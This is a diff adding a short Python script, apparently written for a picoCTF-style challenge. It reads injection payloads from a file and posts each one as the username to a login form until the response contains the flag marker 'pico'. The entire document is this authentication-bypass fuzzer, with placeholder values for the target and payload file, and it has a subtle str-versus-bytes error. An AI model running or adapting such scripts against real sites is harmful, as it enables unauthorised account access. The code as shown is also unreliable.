@@ -1,0 +1,19 @@
+import requests
+import sys
+
+print ("\n\t\t[Editor by h3ll38]\n")
+
+url = "site"
+done = "pico"
+words = open("directory","rb").readlines()
+print ("[*]url :\t site \n")
+
+for i in words:
+    add = i.strip()
+    http = requests.post(url,data={'user':add,'password':'password'})
+    content = http.content
+    if done in content:
+            print ("[+]Found inject correct : \t" + add + "\n")
+            break
+    else:
+            print ("[-]Incorect inject : \t" + add)
